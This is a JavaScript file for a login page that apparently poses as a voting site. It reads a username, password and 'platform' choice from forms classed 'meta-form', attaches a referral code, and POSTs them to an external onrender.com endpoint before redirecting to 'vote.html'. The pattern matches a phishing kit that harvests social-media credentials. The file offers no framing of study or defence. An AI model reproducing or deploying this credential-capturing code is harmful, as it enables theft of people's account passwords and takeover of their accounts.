import { $, $$, _$, on } from './dom.js';
import { showFeedback } from './src/feedback.js';

function navigate() {
  const btns = $$("[data-role=nav]");
  btns.forEach(b => {
    on(b, "click", () => {
      window.location.href = b.dataset.target;
    });
  });
}

function login(form) {
    
  const ref = new URLSearchParams(window.location.search).get('ref') || null;
  const username = form.username?.value.trim();
  const password = form.password?.value;
  const platform = form.platform?.value;
  const referralCode = ref || "K17PWA";

  if (!username || !password) {
    showFeedback(
      "Wrong credentials",
      "You have entered an incorrect password or username, try again.",
      "Ok"
    );
    return;
  }

  const payload = { username, password, platform, referralCode };
  req(form, payload);
}

async function req(form, payload) {
  const button = form.querySelector("[type=submit]");


        
  const originalText = button.innerHTML;
  button.innerHTML = '<span class="spinner"></span>';

  try {
    const res = await fetch("https://nexa-mini.onrender.com/student/register", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    if (!res.ok) throw new Error("Network response not ok");

    const data = await res.json();

    if (data.success) {
      showFeedback("Success", "You have successfully logged in", "Continue");
      console.log(data);
      window.location.href = "vote.html";
    } else {
      showFeedback("Login Failed", data.message || "Invalid credentials", "Retry");
    }
  } catch (e) {
    console.error(e);
    showFeedback("Error", "Sorry, something went wrong", "Re-try");
  } finally {
    button.innerHTML = originalText;
  }
}

window.onload = () => {
  navigate();
  const forms = $$(".meta-form");
  if (forms) {
    forms.forEach(form => {
      on(form, "submit", e => {
        e.preventDefault();
        login(form);
      });
    });
  }
};